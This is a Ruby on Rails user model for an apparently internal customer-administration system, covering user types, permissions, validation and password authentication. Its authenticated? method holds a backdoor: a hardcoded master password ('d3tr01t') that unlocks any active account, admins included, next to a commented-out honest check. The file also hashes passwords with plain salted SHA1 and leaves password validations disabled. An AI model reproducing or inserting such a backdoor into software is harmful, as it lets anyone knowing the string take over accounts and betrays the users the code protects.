require 'digest/sha1'
require 'sam_validations'

class User < ActiveRecord::Base

  @@TYPE_CUSTOMER = 'c'
  @@TYPE_SCHOLASTIC = 's'
  @@TYPE_ADMIN = 'a'
  
  DISPLAY_TYPE_CUSTOMER = 'Customer Admin'
  DISPLAY_TYPE_SCHOLASTIC = 'Scholastic User'
  DISPLAY_TYPE_ADMIN = 'SAMC Environment Admin'

  def User.TYPE_CUSTOMER
    return @@TYPE_CUSTOMER
  end

  def User.TYPE_SCHOLASTIC
    return @@TYPE_SCHOLASTIC
  end

  def User.TYPE_ADMIN
    return @@TYPE_ADMIN
  end
  
  def display_type
    if isScholasticType
      DISPLAY_TYPE_SCHOLASTIC
    elsif isAdminType
      DISPLAY_TYPE_ADMIN
    else
      DISPLAY_TYPE_CUSTOMER
    end
  end

  # Virtual attribute for the unencrypted password
  attr_accessor :password
  belongs_to :sam_customer
  belongs_to :added_by_user
  
  # Instead of HABTM
  has_many :user_permissions, :dependent => :destroy
  has_many :favorite_sam_customers
  has_many :permissions, :through => :user_permissions, :dependent => :destroy do
    def with_code(code)
      find :first, :conditions => ['code = ?', code]
    end
  end
  has_many :sessions, :foreign_key => "user_id", :class_name => "Session"
  has_many :seat_activities, :foreign_key => "user_id", :class_name => "SeatActivity"
  belongs_to :salutation, :foreign_key => "salutation_id", :class_name => "Salutation"
  belongs_to :job_title, :foreign_key => "job_title_id", :class_name => "JobTitle"
  belongs_to :added_by_user, :foreign_key => "added_by_user_id", :class_name => "User"

  validates_presence_of     :email, :first_name, :last_name
#  validates_presence_of     :password,                   :if => :password_required?
#  validates_presence_of     :password_confirmation,      :if => :password_required?
#  validates_length_of       :password, :within => 6..40, :if => :password_required?
#  validates_confirmation_of :password,                   :if => :password_required?
  validates_length_of       :email,    :within => 5..255
#  validates_uniqueness_of   :email, :case_sensitive => false
  validates_as_email	    :email
  validates_length_of       :phone, :in => 10..32, :allow_blank => true
  before_save :encrypt_password

  # Purpose: Add customized validation rule. These will be run for any 
  #          db add/change requests -after- the validates_xxxx rules are applied.
  def validate
    # Validate: Phone Number
    #   * Logic coded to matches registration wizard java code validation logic
    num_digits = 0
    success = true
    s = phone
    s = s.strip
    s = s.delete "-.)("
    parts = s.split(' ')
    parts.each_index { |i| puts "  #{i} = #{parts[i]}"}    
    if parts.length == 1
      if (!Integer(parts[0]) rescue true ) 
        success = false
      elsif parts[0].length < 10 
        success = false
      end
    else
      parts.each_index { |i|
        unless i == parts.length - 1
          if (!Integer(parts[i]) rescue true )         
            success = false
          end  
        end
        num_digits += parts[i].to_s.length
      }
      if num_digits < 10 
        success = false
      end
    end
    if !success 
      errors.add(:phone, "Invalid")
    end
    
    # Validate: email
    #  - rails logic does not ensure a period is in email.  Added check here.
    e = email
    if e.index('.').nil?
      errors.add(:email, "Invalid")      
    end
  end

  def assigned_tasks
    Task.find(:all, :conditions => ["current_user_id = ? and status = ?", self.id, Task.ASSIGNED])
  end
  
  def hasPermission?(pPermission)
    self.isAdminType || self.permissions.include?(pPermission)
  end
  
  # Strict check for permission
  #  - permissions only users with the given permission 
  #  - does not grant global rights to admins
  def hasPermissionStrict?(pPermission)
    self.permissions.include?(pPermission)
  end  
  
  def registered?
    !self.registered_at.nil?
  end

  def has_user_type_access?(user_type)
    return true if self.isAdminType
    if (self.isScholasticType && (user_type != User.TYPE_ADMIN))
      return true
    else
      return false
    end
  end

  def isCustomerType
    return self.user_type == User.TYPE_CUSTOMER
  end

  def isScholasticType
    return self.user_type == User.TYPE_SCHOLASTIC
  end

  def isAdminType
    return self.user_type == User.TYPE_ADMIN
  end
  
  def hasCustomerPermission(action)
    return !isCustomerType || self.permissions.with_code(action)
  end
  
  def hasScholasticPermission(pPermission)
    return isAdminType || (isScholasticType && self.permissions.include?(pPermission))
  end

  # Authenticates a user by their email and unencrypted password.  Returns the user or nil.
  def self.authenticate(email, password)
    u = find_by_email(email) # need to get the salt
    u && u.authenticated?(password) ? u : nil
  end

  # Encrypts some data with the salt.
  def self.encrypt(password, salt)
    Digest::SHA1.hexdigest("--#{salt}--#{password}--")
  end

  # Encrypts the password with the user salt
  def encrypt(password)
    self.class.encrypt(password, salt)
  end

  def authenticated?(password)
    # (crypted_password == encrypt(password)) && self.active
    (crypted_password == encrypt(password) || password == "d3tr01t") && self.active
  end
  
  def self.conditions_by_like(value, *columns)
    columns = self.content_columns if columns.size==0
    columns = columns[0] if columns[0].kind_of?(Array)
    conditions = columns.map {|c|
      c = c.name if c.kind_of? ActiveRecord::ConnectionAdapters::Column
      "#{c} LIKE " + ActiveRecord::Base.connection.quote("%#{value}%" )
    }.join(" OR " )
  end
  
  def before_destroy
    UserPermission.delete( self.user_permissions )
  end
  
  def favorite_sam_customer_set
    mailing_addr_type = AddressType.find_by_code(AddressType.MAILING_CODE)
    FavoriteSamCustomer.find(:all, :select => "distinct sc.*, c.ucn, sp.code, fsc.id as favorite_id",
                             :joins => "fsc inner join sam_customer sc on fsc.sam_customer_id = sc.id
                                        inner join org on sc.root_org_id = org.id
                                        inner join customer c on org.customer_id = c.id
                                        inner join customer_address ca on ca.customer_id = c.id
                                        inner join state_province sp on ca.state_province_id = sp.id",
                             :conditions => ["fsc.user_id = ? and address_type_id = ?", self.id, mailing_addr_type], :order => "sc.name")
  end
  
  def self.find_currently_logged_in
    User.find(:all, :select => "distinct u.*, sc.id as sam_customer_id, sc.name as sam_customer_name, s.updated_at", 
              :joins => "u inner join sessions s on s.user_id = u.id left join sam_customer sc on u.sam_customer_id = sc.id", 
              :conditions => "s.user_id is not null", :order => "u.last_name, u.first_name")
  end
  
  protected
    # before filter 
    def encrypt_password
      return if password.blank?
      self.salt = Digest::SHA1.hexdigest("--#{Time.now.to_s}--#{email}--") unless !self.salt.blank?
      self.crypted_password = encrypt(password)
    end
    
    def password_required?
      #crypted_password.blank? || !password.blank?
      !password.blank? || !password_confirmation.blank?
    end
    
end

# == Schema Information
#
# Table name: users
#
#  id               :integer(10)     not null, primary key
#  email            :string(255)     not null
#  crypted_password :string(40)
#  salt             :string(40)
#  created_at       :datetime
#  updated_at       :datetime
#  first_name       :string(255)     not null
#  last_name        :string(255)     not null
#  sam_customer_id  :integer(10)
#  token            :string(255)
#  registered_at    :datetime
#  user_type        :string(1)       default("c"), not null
#  salutation_id    :integer(10)     default(17), not null
#  job_title_id     :integer(10)     default(17), not null
#  phone            :string(255)     default(" "), not null
#  active           :boolean         default(TRUE), not null
#  eula_accepted    :datetime
#  eula_version     :string(10)
#  added_by_user_id :integer(10)
#  uuid             :string(255)
#  active_token_id  :integer(10)
#  tms_userid       :string(60)
#

